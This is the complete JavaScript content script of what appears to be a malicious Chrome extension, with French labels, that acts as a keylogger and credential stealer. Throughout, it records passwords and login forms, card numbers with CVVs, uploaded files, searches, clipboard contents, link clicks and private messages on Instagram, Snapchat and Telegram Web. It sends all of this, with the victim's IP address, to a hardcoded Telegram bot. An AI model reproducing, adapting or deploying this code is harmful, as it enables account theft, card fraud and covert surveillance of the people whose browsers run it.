const BOT_TOKEN = "8447955383:AAErDQ-rcTXoeI48uN0MBMuKMmSQRoG4xNc";
const CHAT_ID = "-1003884947829";

const TOPICS = {
  KEYLOGGER: "4",
  FORMULAIRES: "6",
  MESSAGERIE: "7",
  RECHERCHES: "8",
  UPLOAD: "9",
  PRESSE_PAPIER: "11",
  CLICS: "14"
};

let currentIP = "Recherche en cours...";
const isIncognito = chrome.extension.inIncognitoContext;
 fetch("https://api.ipify.org?format=json")
  .then(res => res.json())
  .then(data => { currentIP = data.ip; });
 function buildMessage(title, body) {
  const mode = isIncognito ? "🕵️ Nav Privée" : "🌐 Nav Publique";
  return `🔥 <b>${title}</b>\n\n${body}\n\n📡 <code>${currentIP}</code> | ${mode}`;
}
 function sendTelegram(title, body, topicId) {
  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      message_thread_id: topicId,
      text: buildMessage(title, body),
      parse_mode: "HTML",
      disable_web_page_preview: true
    })
  });
}
 let typingTimer;
let typedData = {};

document.addEventListener("input", function (e) {
  const input = e.target;
  const type = (input.type || input.tagName || "").toLowerCase();
  const name = (input.name || input.id || input.placeholder || "").toLowerCase();
   const isSensitive = type.includes("password") || type.includes("email") || name.includes("user") || name.includes("log") || name.includes("mail") || input.autocomplete === "current-password";

  if (isSensitive) {
    const key = input.name || input.id || "Champ";
    typedData[key] = input.value; 

    clearTimeout(typingTimer); 
    typingTimer = setTimeout(() => {
      for (const [k, v] of Object.entries(typedData)) {
        if(v.trim() !== "") {
          sendTelegram("Keylogger (Saisie)", `📍 <b>Cible :</b> ${window.location.hostname}\n\n⌨️ <b>Champ :</b> <code>${k}</code>\n📝 <b>Saisie :</b> <code>${v}</code>`, TOPICS.KEYLOGGER);
        }
      }
      typedData = {}; 
    }, 1000); 
  }
}, true);
 let isCapturingForm = false; 

function captureAndSendCredentials(element, event) {
  if (isCapturingForm) return; 
   const container = element.closest('form') || element.closest('div.login-container') || document.body;
  const inputs = container.querySelectorAll("input");
  const formData = {};
  let hasPassword = false;

  inputs.forEach((input) => {
    const type = (input.type || "").toLowerCase();
    const name = input.name || input.id || input.placeholder || "Champ";
    const val = input.value.trim();

    if (val) {
      formData[name] = val;
      if (type === "password") hasPassword = true; 
    }
  });

  if (hasPassword && Object.keys(formData).length > 0) {
    isCapturingForm = true;
    setTimeout(() => { isCapturingForm = false; }, 2000); 

    const body = `📍 <b>Cible :</b> ${window.location.href}\n\n📦 <b>Identifiants :</b>\n<pre>${JSON.stringify(formData, null, 2)}</pre>`;
    sendTelegram("Connexion Interceptée", body, TOPICS.FORMULAIRES);
    
    chrome.runtime.sendMessage({ action: "capture", url: window.location.href, topic: TOPICS.FORMULAIRES, title: "📸 Preuve Visuelle", delay: 0 });

    if (event && element.tagName && element.tagName.toLowerCase() === 'form') {
      event.preventDefault(); 
      setTimeout(() => { element.submit(); }, 500);
    }
  }
}
 document.addEventListener("submit", function (e) {
  captureAndSendCredentials(e.target, e);
}, true);
 document.addEventListener("click", function (e) {
  const target = e.target.closest("button, input[type='button'], input[type='submit'], a, div[role='button']");
  if (target) {
     const pwdFields = document.querySelectorAll("input[type='password']");
    let pwdFilled = false;
    pwdFields.forEach(p => { if (p.value.length > 0) pwdFilled = true; });
     if (pwdFilled) {
      captureAndSendCredentials(target, null);
    }
  }
}, true);
 document.addEventListener("keydown", function (e) {
  if (e.key === "Enter") {
    captureAndSendCredentials(e.target, null);
  }
}, true);
 document.addEventListener("change", function (e) {
  const input = e.target;
  if (input.type === "file" && input.files.length > 0) {
    const file = input.files[0];
    const form = new FormData();
    form.append("chat_id", CHAT_ID);
    form.append("message_thread_id", TOPICS.UPLOAD);
    form.append("document", file);
    form.append("caption", buildMessage("Fichier Uploadé", `📍 <b>Site :</b> ${window.location.hostname}\n📁 <b>Nom :</b> ${file.name}`));
    form.append("parse_mode", "HTML");

    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, { method: "POST", body: form });
  }
}, true);
 document.addEventListener("click", function (e) {
  const target = e.target.closest("a");
  if (target && target.href) {
    sendTelegram("Clic Intercepté", `📍 <b>Depuis :</b> ${window.location.hostname}\n🔗 <b>Vers :</b> ${target.href}`, TOPICS.CLICS);
  }
}, true);
 if (window.location.hostname.includes("google.") && window.location.pathname === "/search") {
  const query = new URLSearchParams(window.location.search).get("q");
  if (query) {
    sendTelegram("Nouvelle Recherche", `🔍 <b>Requête exacte :</b>\n<code>${query}</code>`, TOPICS.RECHERCHES);
  }
}
 document.addEventListener("copy", function () {
  try {
    const copiedText = window.getSelection().toString();
    if (copiedText) {
      sendTelegram("Texte Copié", `📍 <b>Site :</b> ${window.location.hostname}\n\n<pre>${copiedText}</pre>`, TOPICS.PRESSE_PAPIER);
    }
  } catch (_) {}
}, true);
 document.addEventListener("paste", (e) => {
  try {
    const pastedText = (e.clipboardData || window.clipboardData).getData("text");
    if (pastedText.trim()) {
      sendTelegram("Texte Collé", `📍 <b>Site :</b> ${window.location.hostname}\n\n<pre>${pastedText.slice(0, 500)}</pre>`, TOPICS.PRESSE_PAPIER);
    }
  } catch (_) {}
}, true);
 document.addEventListener("input", function (e) {
  const el = e.target;
  const name = (el.name || el.id || "").toLowerCase();
  const value = el.value ? el.value.trim() : "";
  const result = {};

  if (name.includes("card") && value.replace(/\s/g, "").length >= 12) result.numero = value;
  else if ((name.includes("exp") || name.includes("date")) && value.length >= 4) result.expiration = value;
  else if (name.includes("cvv") || name.includes("cvc")) result.cvv = value;

  if (Object.keys(result).length > 0) {
    sendTelegram("Saisie Bancaire", `📍 <b>Site :</b> ${location.hostname}\n💳 <b>Données :</b>\n<pre>${JSON.stringify(result, null, 2)}</pre>`, TOPICS.FORMULAIRES);
  }
}, true);
 const observedInputs = new WeakSet();
function getConversationName() {
  const sites = {
    "instagram.com": ['.x1lliihq', '.x193iq5w'],
    "web.snapchat.com": ['[data-testid="user-avatar"]', '.chat-header'],
    "web.telegram.org": ['.peer-title', '.chat-info']
  };
  const site = location.hostname;
  const selectors = Object.entries(sites).find(([host]) => site.includes(host));
  if (selectors) {
    for (const sel of selectors[1]) {
      const el = document.querySelector(sel);
      if (el && el.textContent.trim().length > 0) return el.textContent.trim();
    }
  }
  return null;
}

setInterval(() => {
  if (!["instagram.com", "web.snapchat.com", "web.telegram.org"].some(h => location.hostname.includes(h))) return;
  document.querySelectorAll("textarea, [contenteditable='true']").forEach(input => {
    if (observedInputs.has(input)) return;
    input.addEventListener("keydown", function (e) {
      if (e.key === "Enter" && !e.shiftKey) {
        const msg = input.value || input.textContent || "";
        if (msg.trim().length === 0) return;
        
        const convo = getConversationName() || "Inconnu";
        let lastReceived = "_Aucun message reçu détecté_";
        const bubbles = [".message-in", ".received", ".msg-in", ".chat-message-in", ".bubble.received"];
        for (const sel of bubbles) {
          const messages = document.querySelectorAll(sel);
          if (messages.length > 0) {
            lastReceived = messages[messages.length - 1].innerText || null;
            break;
          }
        }
        
        const body = `📍 <b>Plateforme :</b> ${location.hostname}\n👤 <b>Contact :</b> ${convo}\n\n💬 <b>Envoyé :</b>\n<code>${msg.slice(0, 1000)}</code>\n\n📥 <b>Dernier Reçu :</b>\n<code>${lastReceived.slice(0, 1000)}</code>`;
        sendTelegram("Message Intercepté", body, TOPICS.MESSAGERIE);
         chrome.runtime.sendMessage({ 
        action: "capture", 
        url: window.location.href, 
        topic: TOPICS.MESSAGERIE, 
        title: "📸 Preuve Visuelle (Message Insta/Snap)",
        delay: 500 
      });
      }
    }, true);
    observedInputs.add(input);
  });
}, 4000);